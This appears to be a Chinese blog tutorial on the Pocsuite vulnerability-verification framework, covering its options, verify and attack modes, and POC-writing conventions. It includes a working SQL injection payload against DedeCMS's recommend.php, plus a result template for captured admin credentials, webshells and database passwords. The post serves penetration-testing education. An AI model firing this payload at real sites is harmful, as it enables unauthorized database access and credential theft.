---
draft: false
date: 2016-09-08 20:38:45
title: POC 框架 Pocsuite
description: 
categories:
  - Pentest
tags:
  - tools
---

### 0x00 关于Pocsuite
Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。

### 0x01 简单介绍
* 安装
    * 使用pip install pocsuite即可安装
    ![安装pocsuite](/img/post/pocsuite_install.png)
* 常用参数
    * -u 指定一个目标url
    * -f 指定一个存放目标url的文件
    * -r 指定一个存放poc的文件夹
    * --report 导出结果到html文件
    * --cookie 携带cookie
    * --referer 修改referer
    * --user-agent 修改UA
* 模式
    * 执行一个poc有两种模式
        * \-\-verify 漏洞验证模式(只是验证，不能更改服务器的东西)
        * \-\-attack 漏洞利用模式
    * 示例
        * ```pocsuite -u "http://www.xxxx.com" -r poc_path/poc_name.py --atack```
* poc编写
    * 可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类)
    * 此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)
        * ```pocsuite -u "http://www.xxxx.com" -r poc_path/server/ --verify```

* poc的命名规范
    * 漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为```"_"```),大致如下：
        * _xxxx_struct2_2016_s2_016_code_execution.py
        * _xxxx_dedecms_20130715_sql_inj.py
* poc的编写流程
    * 导入pocsuite API模块
    * 创建TestPOC类
    * 填写POC信息
    * 编写_berify()方法
    * 编写_attack()方法
    * 注册类

### 0x02 实例
> ```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 导入pocsuite的必要模块
from pocsuite.net import req # requests模块，和requests用法完全一样
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    """docstring for TestPOC"""
    vulID            = ''      # VUL ID
    version          = ''      # 版本号,默认为1
    author           = ''      # POC 作者的大名
    vulDate          = ''      # 漏洞公开的时间,不知道就写今天
    createDate       = ''      # 编写 POC 的日期
    updateDate       = ''      # POC更新的时间,默认和编写时间一样
    references       = ['']    # 漏洞地址来源,0day 不用写
    name             = ''      # POC 名称
    appPowerLink     = ''      # 漏洞厂商主页地址
    appName          = ''      # 漏洞应用名称
    appVersion       = ''      # 漏洞影响版本
    vulType          = ''      # 漏洞类型,类型参考见 漏洞类型规范表
    desc             = ''' ''' # 漏洞简要描述
    samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
    install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块

    def _verify(self, verify=True): # 漏洞测试代码
        result = {}
        target_url = self.url

        # 这里写入漏洞测试代码
        path = "/plus/recommend.php"
        payload = "?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        html = req.get(target_url + path + payload, timeout=10).content
        if '5e8523b1645e6225001b9027cddc1c85' in html:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + path
            result['VerifyInfo']['Path'] = path
            result['VerifyInfo']['Payload'] = payload
        
        return self.parse_attack(result)

    def _attack(self): # 漏洞利用代码
        # result = {}
        # # 先进行检测是否存在漏洞
        # if not self._verify(verify=False):
        #     return self.parse_attack(result)
        # target_url = self.url

        # # 这里写漏洞利用代码

        # return self.parse_attack(result)
        
        return self._verify() # 如果没漏洞利用代码，可以直接return测试函数

    def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Nothing returned')
        return output

register(TestPOC) #注册类
```

### 0x03 关于poc中result字典的内容
> ```
# result是一个字典，里面存储所有的漏洞信息:
result：{
    'DBInfo': {
        'Username': '管理员用户名',
        'Password'：'管理员密码',
        'Salt': '加密盐值',
        'Uid': '用户ID',
        'Groupid': '用户组ID'
        }
    'ShellInfo': {
        'URL': 'Webshell地址',
        'Content': 'Webshell内容'
        }
    'FileInfo': {
        'Filename': '文件名称',
        'Content': '文件内容'
        }
    'XSSInfo': {
        'URL': '验证URL',
        'Payload': '验证Payload'
        }
    'AdminInfo': {
        'Uid': '管理员ID',
        'Username': '管理员用户名',
        'Password': '管理员密码'
        }
    'Database': {
        'Hostname': '数据库主机名',
        'Username': '数据库用户名' ,
        'Password': '数据库密码',
        'DBname': '数据库名'
        }
    'VerifyInfo': {
        'URL': '验证URL',
        'Postdata': '验证POST数据',
        'Path': '网站绝对路径'
        }
    'SiteAttr': {
        'Process': '服务器进程'
        }
}
```